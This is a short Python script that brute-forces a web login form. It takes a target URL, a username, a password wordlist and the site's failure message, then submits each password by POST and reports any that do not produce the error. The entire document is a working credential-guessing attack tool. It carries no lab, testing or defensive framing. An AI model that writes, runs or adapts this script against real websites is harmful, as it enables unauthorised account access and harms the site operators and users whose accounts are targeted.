import requests

# Define the login page URL

url = input("Enter Target Url: ")

# Get the username
username = input("What is the username you wish to attempt? ")

# Get the password file
password_file = input("Please enter the name of the password file: ")

# Get the error message
error_msg = input("Please enter the error message when incorrect :")

# Open the password file in read mode
with open(password_file, "r") as file:
    for password in file.readlines():
        # Strip newline characters from the password
        password = password.strip("\n")

        # Collect the data needed from "inspect element"
        data = {'username': username, 'password': password, "Login": 'submit'}

        # Send the POST request with the data
        response = requests.post(url, data=data)

        # Check if the login was successful
        if error_msg in str(response.content):
            print("[*] Incorrect Username or Password: %s" % password)
        else:
            print("[*] Password found: %s" % password)
